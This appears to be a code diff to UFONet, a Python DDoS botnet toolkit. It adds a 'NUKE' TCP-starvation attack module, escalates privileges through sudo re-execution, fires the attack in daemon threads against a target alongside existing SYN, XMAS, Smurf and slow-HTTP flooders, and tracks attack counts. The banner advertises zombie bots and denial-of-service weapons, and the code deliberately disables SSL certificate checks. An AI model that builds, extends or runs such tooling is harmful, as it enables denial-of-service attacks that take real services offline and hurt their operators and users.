@@ -26,6 +26,7 @@ from core.mods.ufosyn import UFOSYN
 from core.mods.spray import SPRAY
 from core.mods.smurf import SMURF
 from core.mods.xmas import XMAS
+from core.mods.nuke import NUKE
 
 class UFONet(object):
     def __init__(self):
@@ -86,6 +87,7 @@ class UFONet(object):
         self.total_spray = 0
         self.total_smurf = 0
         self.total_xmas = 0
+        self.total_nuke = 0
         self.total_zombies_failed_connection = 0
         self.ctx = ssl.create_default_context() # creating context to bypass SSL cert validation (black magic)
         self.ctx.check_hostname = False
@@ -143,19 +145,20 @@ class UFONet(object):
         print "       (O)_  (O)   '----'   (O)  _(O)        ||                                             ||"   
         print "           |  |.''.( xx ).''.|  |            ||      /Zombies : HTTP GET bots               ||"
         print "           .'.'    |'..'|    '.'.            ||      /Droids  : HTTP GET (+params) bots     ||"
-        print "    .-.  .' /'--.__|____|__.--'\ '.  .-.     ||      /Aliens  : HTTP POST bots              ||"
+        print "    .-.  .' /'--.__|_00_|__.--'\ '.  .-.     ||      /Aliens  : HTTP POST bots              ||"
         print "   (O).)-| |  \  x |    |x   /  | |-(.(O)    ||      /UCAVs   : Web Abusing bots            ||"
         print "    `-'  '-'-._'-./ ---- \.-'_.-'-'  `-'     ||      /X-RPCs  : XML-RPC bots                ||"
         print "       _ | |   '-.___||___.-'   | | _        ||      /SPRAY   : TCP-SYN reflector           ||"
         print "    .' _ | |   O |   __   | O   | | _ '.     ||      /SMURF   : ICMP echo flooder           ||"
-        print "   / .' ''.|  || | /____\ | ||  |.'' '. \    ||                                             ||"
+        print "   / .' ''.|  || | /_00_\ | ||  |.'' '. \    ||                                             ||"
         print "   | '     |  =| | ###### | |=  |'      |    ||  * Close Combat -> [DoS]:                   ||"
         print "   | |(0)| '.   \||__**_ ||/   .' |(0)| |    ||                                             ||"
         print "   \ '._.'   '.  | \_##_/ |  .'   '._.' /    ||      /LOIC    : Fast HTTP requests          ||"
-        print "    '.__ ______'.|__'--'__|.'______ __.'     ||      /LORIS   : Slow HTTP requests          ||"
+        print "    '.__ ____0_'.|__'--'__|.'_0____ __.'     ||      /LORIS   : Slow HTTP requests          ||"
         print "   .'_.-|                          |-._'.    ||      /UFOSYN  : TCP-SYN flooder             ||"
         print "                                             ||      /XMAS    : TCP-XMAS flooder            ||" 
-        print "   + Class: UFONet / ViPR404+ (model D) +    ||                                             ||"
+        print "   + Class: UFONet / ViPR404+ (model E) +    ||      /NUKE    : TCP-STARVATION attack       ||"
+        print "                                             ||                                             ||"
         print "                                             0|=============================================|0" 
         print ""
 
@@ -468,6 +471,17 @@ class UFONet(object):
                     os.execlpe('sudo', *args)
                 except:
                     pass # keep running, but XMAS will fail
+
+        # check EUID when running NUKE (root required)
+        if options.nuke:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [NUKE] (--nuke) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but NUKE will fail
 
         # search for [Zombies] on search engines results (dorking)
         if options.search:
@@ -1243,7 +1257,7 @@ class UFONet(object):
     def update_flying_stats(self):
         if not os.path.exists(self.mothership_stats_file) == True: # create data when no stats file (first time used)
             with open(self.mothership_stats_file, "w") as f:
-                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "ufosyn": "0", "spray": "0", "smurf": "0", "xmas": "0", "crashed": "0"}, f, indent=4) # starting reset
+                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "ufosyn": "0", "spray": "0", "smurf": "0", "xmas": "0", "nuke": "0", "crashed": "0"}, f, indent=4) # starting reset
         stats_json_file = open(self.mothership_stats_file, "r")
         data = json.load(stats_json_file)
         stats_json_file.close()
@@ -1391,6 +1405,18 @@ class UFONet(object):
         axmas = str(int(axmas) + 1) # add new xmas attack to recorded stats
         self.total_xmas = self.total_xmas + 1 # add new xmas attack to session stats
         data["xmas"] = axmas
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_nuke_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        anuke = data["nuke"]
+        anuke = str(int(anuke) + 1) # add new nuke attack to recorded stats
+        self.total_nuke = self.total_nuke + 1 # add new nuke attack to session stats
+        data["nuke"] = anuke
         stats_json_file = open(self.mothership_stats_file, "w+")
         stats_json_file.write(json.dumps(data))
         stats_json_file.close()
@@ -3570,7 +3596,7 @@ class UFONet(object):
         else:
             print "\n[Error] [AI] Target not valid: "+target+" -> [Discarding!]\n"
 
-    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn, spray, smurf, xmas):
+    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn, spray, smurf, xmas, nuke):
         # perform some other extra attacks (such as DoS techniques)
         time.sleep(2) # aiming (multi-threading flow time compensation)
         if loic:
@@ -3645,6 +3671,21 @@ class UFONet(object):
             t6.daemon = True
             t6.start()
             self.update_xmas_stats() # add new XMAS attack to mothership
+        if nuke:
+            if sys.platform == "linux" or sys.platform == "linux2":
+                try:
+                    self.options.nuke = int(nuke)
+                except:
+                    self.options.nuke = 100 # default NUKE requests
+                if self.options.nuke < 1:
+                    self.options.nuke = 100
+                self.instance = NUKE() # instance main class for NUKE operations
+                t = threading.Thread(target=self.instance.attacking, args=(target, self.options.nuke)) # NUKE using threads
+                t.daemon = True # extra weapons are threaded as daemons
+                t.start()
+                self.update_nuke_stats() # add new NUKE attack to mothership
+            else:
+                print "\n[Info] [AI] Your OS cannot perform this attack... -> [Passing!]\n"
 
     def stressing(self, target, zombie):
         # perform a DDoS Web attack against a target, requesting records on target's database
@@ -3868,8 +3909,8 @@ class UFONet(object):
                 num_hits = 0
                 num_zombie = 1
                 # start to attack the target with [MODS]
-                if options.loic or options.loris or options.ufosyn or options.spray or options.smurf or options.xmas:
-                    ex = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn, self.options.spray, self.options.smurf, self.options.xmas)) # multithreading flow for extra attacks
+                if options.loic or options.loris or options.ufosyn or options.spray or options.smurf or options.xmas or options.nuke:
+                    ex = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn, self.options.spray, self.options.smurf, self.options.xmas, self.options.nuke)) # multithreading flow for extra attacks
                     ex.daemon = True # extra weapons are threaded as daemons
                     ex.start()
                 # start to attack the target with [ARMY]
